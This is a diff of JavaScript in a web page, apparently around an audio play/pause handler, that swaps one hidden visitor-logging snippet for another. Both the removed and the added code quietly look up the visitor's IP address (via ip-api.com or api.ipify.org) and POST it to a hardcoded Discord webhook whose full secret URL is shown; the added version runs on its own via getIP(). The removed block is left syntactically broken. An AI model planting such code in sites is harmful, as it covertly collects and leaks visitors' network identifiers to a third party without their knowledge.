@@ -183,64 +183,32 @@ font-family: 'Open Sans Condensed', sans-serif;
             else if(more % 2 != 0){
                 $(myAudio)[0].pause();
                 more++;
-fetch('http://ip-api.com/json/?fields=61439')
-  .then(response => response.json())
-  .then(data => {
+
+//
+                
+function getIP() {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => postToWebhook(data.ip));
+}
+
+// Function to post the IP address to a Discord webhook
+function postToWebhook(ip) {
+  let webhookURL = 'https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh';
   
-    const payload = {
-   
+  let payload = {
+    'content': `The IP address of this device is ${ip}`
+  }
 
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  });
+}
 
-
-  <script type="module">
-   
-    let xhr = new XMLHttpRequest();
-
-   
-    let url = "http://ip-api.com/json/?fields=61439";
-
- 
-    xhr.open("GET", url);
-
-  
-    xhr.responseType = "json";
-
-    
-    xhr.send();
-
-   
-    xhr.onload = function() {
-     
-      let response = xhr.response;
-
-      // Define the Discord webhook URL
-      let discordWebhookURL = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
-
-      // Define the payload to send to the Discord webhook
-      let payload = {
-        // Add your payload data here based on the webhook documentation
-      };
-
-      // Create a new XMLHttpRequest object to make a request to the Discord webhook URL
-      let discordWebhookXHR = new XMLHttpRequest();
-
-      // Use the POST method to send the payload data to the Discord webhook
-      discordWebhookXHR.open("POST", discordWebhookURL);
-
-      // Set the content type of the request to JSON
-      discordWebhookXHR.setRequestHeader("Content-Type", "application/json");
-
-      // Send the payload data to the Discord webhook
-      discordWebhookXHR.send(JSON.stringify(payload));
-
-      // Output a message to the console to indicate that the payload data has been sent to the Discord webhook
-      console.log("Payload data has been sent to the Discord webhook.");
-    };
-
-    // Define a function to handle any errors that occur when making a request to the API endpoint
-    xhr.onerror = function() {
-      // Output an error message to the console
-      console.error("An error occurred while making a request to the API endpoint.");
-    };
-  </script>
-</body>
+// Call the getIP function to start the process
+getIP();
+```
